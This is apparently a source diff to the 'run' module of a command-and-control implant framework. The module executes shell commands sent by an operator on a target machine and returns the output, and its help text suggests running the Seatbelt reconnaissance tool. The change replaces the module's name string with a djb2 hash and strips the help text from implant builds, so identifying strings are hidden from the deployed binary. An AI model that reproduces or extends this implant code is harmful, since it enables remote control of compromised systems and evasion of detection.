@@ -5,6 +5,9 @@
 #include <thread>
 #include <future>
 
+#include "Common.hpp"
+
+
 #ifdef _WIN32
 	#pragma warning( disable : 4800 ) 
 #else
@@ -13,7 +16,8 @@
 
 using namespace std;
 
-const std::string moduleName = "run";
+constexpr std::string_view moduleName = "run";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 #define BUFSIZE 4096
 
@@ -27,7 +31,11 @@ __declspec(dllexport) Run* RunConstructor()
 #endif
 
 Run::Run()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -38,6 +46,7 @@ Run::~Run()
 std::string Run::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "run:\n";
 	info += "Run new process on the system.\n";
 	info += "If the cmd is a system cmd use the following syntax 'cmd /c command'.\n";
@@ -46,7 +55,7 @@ std::string Run::getInfo()
 	info += " - run whoami\n";
 	info += " - run cmd /c dir\n";
 	info += " - run .\\Seatbelt.exe -group=system\n";
-
+#endif
 	return info;
 }
 
@@ -77,7 +86,7 @@ int Run::process(C2Message &c2Message, C2Message &c2RetMessage)
 	string shellCmd = c2Message.cmd();
 	std::string outCmd = execBash(shellCmd);
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(shellCmd);
 	c2RetMessage.set_returnvalue(outCmd);
 
